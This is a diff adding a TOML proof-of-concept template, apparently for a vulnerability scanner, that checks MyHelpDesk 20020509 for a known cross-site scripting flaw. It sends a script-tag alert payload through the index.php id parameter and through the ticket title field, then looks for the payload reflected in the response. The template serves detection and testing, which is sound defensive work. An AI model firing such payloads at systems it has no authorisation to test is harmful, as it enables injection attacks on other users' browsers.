@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "MyHelpDesk 20020509 存在跨站脚本漏洞，远程攻击者可通过工单创建时的 Title/Description 字段或 index.php 的 id 参数注入恶意 HTML/JavaScript 代码。当其他用户访问受影响页面时注入脚本将在其浏览器中执行。"
+id = "POC-AVE-2002-0478"
+name = "MyHelpDesk 20020509 HTML Injection PoC"
+severity = "high"
+tags = ["ave-2002-0478"]
+vuln_id = [
+    "CVE-2002-0931",
+    "AVE-2002-0478",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.php?id=<script>alert('XSS')</script>"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "title=<script>alert('XSS')</script>&description=test&action=newticket"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
